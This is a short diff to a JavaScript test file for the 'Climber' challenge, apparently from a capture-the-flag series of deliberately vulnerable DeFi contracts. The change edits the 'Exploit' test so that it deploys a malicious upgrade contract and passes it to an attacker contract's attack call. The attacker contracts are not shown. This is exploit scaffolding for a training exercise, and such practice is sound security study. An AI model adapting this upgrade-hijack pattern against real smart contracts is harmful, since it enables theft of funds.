@@ -54,10 +54,11 @@ describe('[Challenge] Climber', function () {
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
         // const ATTACK_AMOUNT = await ethers.utils.parseEther('0.01');
+        this.climberUpgrade = await (await ethers.getContractFactory('ClimberUpgrade', attacker)).deploy();
         this.attackerContract = await (await ethers.getContractFactory('ClimberAttacker', attacker)).deploy(
             this.timelock.address, this.vault.address, this.token.address
             );
-        this.attackerContract.attack();
+        await this.attackerContract.attack(this.climberUpgrade.address);
     });
 
     after(async function () {
